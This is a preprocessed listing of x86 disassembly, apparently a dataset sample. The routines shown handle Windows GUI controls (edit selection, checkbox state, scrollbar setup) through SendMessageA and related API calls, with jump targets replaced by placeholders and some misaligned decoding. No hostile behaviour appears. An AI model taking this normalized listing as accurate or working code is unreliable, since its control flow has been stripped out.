pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax esi
call sub_441d0c
mov edx 0x19
mov eax esi
call sub_441d30
mov dl 0x1
mov eax esi
call sub_448fb8
xor edx edx
mov eax esi
call sub_442714
mov [ esi + 0x20c ] 0x1
mov [ esi + 0x20f ] 0x1
mov [ esi + 0x210 ] 0x1
mov [ esi + 0x211 ] 0x1
mov eax esi
call sub_43aed0
mov eax esi
test bl bl
je r-xdata
sub_43a84c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xc5
mov eax ebx
call sub_448d84
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_43a8cc
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] esi
mov eax ebx
call sub_449088
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
sub_43a910
push ebx
push esi
mov esi eax
mov bl [ esi + 0x215 ]
mov eax esi
call sub_449088
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb8
mov eax esi
call sub_448d84
push eax
call SendMessageA
test eax eax
setne bl
sub_43a948
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_449088
test al al
je r-xdata
mov [ esi + 0x215 ] bl
pop esi
pop ebx
retn
push 0x0
xor eax eax
mov al bl
push eax
push 0xb9
mov eax esi
call sub_448d84
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_43a980
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43a9fd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x20d ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43aa04
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov [ ebx + 0x20d ] dl
mov eax ebx
call sub_449088
test al al
je r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x20d ]
push eax
push 0xcc
mov eax ebx
call sub_448d84
push eax
call SendMessageA
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_442550
mov eax [ ebp - 0x4 ]
call sub_404554
mov edx eax
mov eax ebx
call sub_44252c
sub_43aa08
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20e ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x20e ] bl
mov eax esi
call sub_449088
test al al
je r-xdata
push 0x0
xor eax eax
mov al bl
push eax
push 0xcf
mov eax esi
call sub_448d84
push eax
call SendMessageA
sub_43aa44
push ebx
push ecx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_448d84
push eax
call SendMessageA
mov eax [ esp ]
pop edx
pop ebx
retn
sub_43aa68
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_448d84
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_43aa88
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_448d84
push eax
call SendMessageA
mov eax [ esp + 0x4 ]
sub eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_43aab8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_448d84
push eax
call SendMessageA
add esi [ esp ]
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0xb1
mov eax ebx
call sub_448d84
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_448d84
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43ab70
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_4424c4
inc eax
call sub_408bb8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43abfa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_408bcc
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4424d4
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0xc ]
add edx esi
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408a1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ac01
mov eax [ ebp - 0xc ]
call sub_408c04
retn
dec edi
mov [ ebp - 0x8 ] edi
sub_43ac0c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov esi eax
mov eax edi
mov ecx esi
xor edx edx
call sub_404184
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
call sub_4424c4
inc eax
call sub_408bb8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43ac9a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_408bcc
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4424d4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add eax edx
mov edx [ edi ]
mov ecx esi
call sub_4028f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_408c04
retn
sub_43aca8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445c10
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_445b3c
mov eax [ esi + 0x4 ]
or eax 0xc0
xor edx edx
mov dl [ ebx + 0x20c ]
or eax [ edx * 4 + rw-data ]
cmp [ ebx + 0x20d ] 0x0
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x20e ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x213 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x211 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x212 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_43ad61
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffff74
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax ebx
call sub_445f0c
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ edx + 0x5 ] 0x8
je r-xdata
mov esi edx
mov edi esp
mov ecx 0x23
[ edi ] [ esi ]
and [ esp + 0x4 ] 0xfffff7ff
mov edx esp
mov eax ebx
call sub_445f0c
mov eax [ ebx + 0x180 ]
test eax eax
je r-xdata
add esp 0x8c
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push eax
call SendMessageA
jmp r-xdata
sub_43add4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x1
xor eax eax
push ebp
push sub_43ae13
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_445d3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ae1a
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x0
retn
sub_43ae1a
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x215 ]
mov eax [ ebp - 0x4 ]
call sub_43a948
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43ae94
pop ecx
pop ebp
retn
push 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20d ]
push eax
push 0xcc
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call SendMessageA
sub_43ae94
push ebx
mov ebx eax
cmp [ ebx + 0x20f ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_43aed0
pop ebx
retn
sub_43aed0
push ebx
push esi
push edi
add esp 0xffffff90
mov esi eax
push 0x0
call GetDC
mov ebx eax
push esp
push ebx
call GetTextMetricsA
mov eax [ esi + 0x68 ]
call sub_41d1e8
push eax
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x38 ]
push eax
push ebx
call GetTextMetricsA
push edi
push ebx
call SelectObject
push ebx
push 0x0
call ReleaseDC
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov ebx [ esp ]
mov eax [ esp + 0x38 ]
cmp ebx eax
jle r-xdata
cmp [ esi + 0x1a5 ] 0x0
je r-xdata
push 0x6
call GetSystemMetrics
shl eax 0x2
test ebx ebx
jns r-xdata
mov ebx eax
mov ebx 0x6
mov ebx 0x8
jmp r-xdata
sar ebx 0x2
add eax ebx
mov ebx eax
add ebx 0x3
mov edx [ esp + 0x38 ]
add edx ebx
mov eax esi
call sub_441d30
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x6
call GetSystemMetrics
imul ebx
mov ebx eax
jmp r-xdata
sub_43af9c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0x7
jne r-xdata
mov edx ebx
mov eax esi
call sub_4468fc
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
jne r-xdata
xor eax eax
mov [ ebx + 0x4 ] eax
sub_43afd4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
retn
push 0xfffffff0
mov eax esi
call sub_448d84
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
push 0x0
push 0x3
push 0xd3
mov eax esi
call sub_448d84
push eax
call SendMessageA
sub_43b014
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44839c
pop esi
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax ebx
call sub_43ae94
mov eax ebx
call sub_446324
sub_43b048
push ebx
mov ebx eax
mov eax ebx
call sub_4482e0
test [ ebx + 0x51 ] 0x2
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_43aed0
test [ ebx + 0x1c ] 0x1
jne r-xdata
sub_43b090
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_448138
pop esi
pop ebx
retn
test [ ebx + 0x54 ] 0x1
jne r-xdata
push 0xfffffff0
mov eax ebx
call sub_448d84
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
mov eax ebx
call sub_43ab54
sub_43b0cc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_449088
test al al
je r-xdata
mov eax esi
mov si 0xffb3
call sub_403540
push 0xfffffff0
mov eax esi
call sub_448d84
push eax
call GetWindowLongA
test al 0x4
je r-xdata
pop esi
retn
sub_43b104
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov edx esi
mov eax ebx
call sub_449e84
pop esi
pop ebx
retn
sub_43b120
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_444a7c
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_43b144
push ebx
mov ebx eax
mov eax ebx
call sub_44eb94
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43b17c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_43b1d2
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_43b1e0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_444ab0
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_43b234
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_449854
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_43b288
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43b2ac
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_446798
mov eax ebx
mov si 0xffb5
call sub_403540
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_448d84
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_403540
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_43b324
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_436540
mov ebx eax
mov eax ebx
call sub_436620
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_448d84
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_4367b8
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43b370
push ebx
push esi
mov esi edx
mov ebx eax
call sub_436540
call sub_436620
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4471d8
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_43b39c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445c10
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_43b3d4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43b1e0
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_441d0c
mov edx 0x19
mov eax esi
call sub_441d30
mov dl 0x1
mov eax esi
call sub_448fb8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_43b460
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_449088
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_448d84
push eax
call SendMessageA
push 0xfffffff0
mov eax ebp
call sub_448d84
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_43b4b4
push ebx
mov ebx eax
mov [ ebx + 0x210 ] dl
mov eax ebx
call sub_449088
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_45a2f0
test eax eax
je r-xdata
mov edx [ eax + 0x220 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_443750
sub_43b4e8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43b39c
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_445b3c
xor eax eax
mov al [ ebx + 0x210 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_43b550
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x212 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_448200
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_45a1f8
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb8
call sub_403540
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403540
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43b5bd
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43b636
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_442550
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45a280
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_448208
mov eax ebx
mov si 0xffb8
call sub_403540
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403540
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b63d
sub_43b644
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
cmp ebx edi
sete al
mov [ ebx + 0x212 ] al
jmp r-xdata
mov dl [ ebx + 0x212 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov edx esi
mov eax ebx
call sub_448210
pop edi
pop esi
pop ebx
retn
sub_43b698
push ebx
push esi
mov esi edx
mov ebx eax
call sub_436540
call sub_436620
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_43b6c4
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_436540
mov ebx eax
mov eax ebx
call sub_436620
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_448d84
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_4367b8
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43b710
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43b1e0
mov edx 0x71
mov eax esi
call sub_441d0c
mov edx 0x11
mov eax esi
call sub_441d30
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_43b778
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403540
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_43b7b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_445ab4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_445a78
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov edi ebx
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_44ee28
sub_43b874
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x211 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] bl
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_448fb8
mov eax [ ebp - 0x4 ]
call sub_449088
test al al
je r-xdata
test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
and eax 0x7f
push eax
push 0xf1
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call SendMessageA
push ebp
call sub_43b7b8
pop ecx
mov eax [ ebp - 0x4 ]
call sub_44215c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403540
sub_43b900
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_43b39c
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_445b3c
mov eax ebx
mov si 0xffc8
call sub_403540
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x4
or eax edx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_43b957
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5c25173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x211 ]
push eax
push 0xf1
mov eax ebx
call sub_448d84
push eax
call SendMessageA
pop ebx
retn
sub_43b98c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43ba01
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_442550
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45a280
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_448208
mov eax ebx
mov si 0xffb8
call sub_403540
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ba08
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_43ba10
push esi
mov esi eax
mov ax [ edx + 0x6 ]
sub ax 0x1
jb r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
retn
sub ax 0x4
je r-xdata
mov eax esi
mov si 0xffe9
call sub_403540
jmp r-xdata
pop esi
retn
sub_43ba40
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_444ab0
mov edx 0x79
mov eax esi
call sub_441d0c
push 0x3
call GetSystemMetrics
mov edx eax
mov eax esi
call sub_441d30
mov dl 0x1
mov eax esi
call sub_448fb8
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x208 ] 0x0
xor eax eax
mov [ esi + 0x20c ] eax
xor eax eax
mov [ esi + 0x210 ] eax
mov [ esi + 0x214 ] 0x64
mov [ esi + 0x220 ] 0x1
mov [ esi + 0x222 ] 0x1
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_43baf8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_445c10
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_445b3c
xor eax eax
mov al [ ebx + 0x208 ]
mov eax [ eax * 4 + rw-data ]
or [ edi + 0x4 ] eax
cmp [ ebx + 0x208 ] 0x1
jne r-xdata
mov eax ebx
call sub_43bc38
test al al
je r-xdata
mov eax ebx
mov si 0xffc8
call sub_403540
test al al
jne r-xdata
mov [ ebx + 0x21c ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
jmp r-xdata
or [ edi + 0x4 ] 0x2
or [ edi + 0x4 ] 0x4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43bb88
call sub_441ef0
mov eax ebx
call sub_445d3c
lea edx [ esp + 0x1c ]
mov eax ebx
call sub_441f10
push 0x0
mov eax [ ebx + 0x214 ]
push eax
mov eax [ ebx + 0x210 ]
push eax
push 0x2
mov eax ebx
call sub_448d84
push eax
call SetScrollRange
mov [ esp ] 0x1c
mov eax [ ebx + 0x218 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x4 ] 0x2
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_448d84
push eax
call SetScrollInfo
mov eax ebx
call sub_43bc38
test al al
je r-xdata
push 0xffffffff
mov eax [ ebx + 0x214 ]
sub eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_448d84
push eax
call SetScrollPos
push 0xffffffff
mov eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_448d84
push eax
call SetScrollPos
jmp r-xdata
add esp 0x2c
pop ebx
retn
sub_43bc38
push ebx
mov ebx eax
mov eax ebx
call sub_442b94
test al al
je r-xdata
mov al 0x1
pop ebx
retn
cmp [ ebx + 0x208 ] 0x1
je r-xdata
xor eax eax
pop ebx
retn
sub_43bc58
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] dl
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax ebx
call sub_446324
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov ecx [ ebx + 0x44 ]
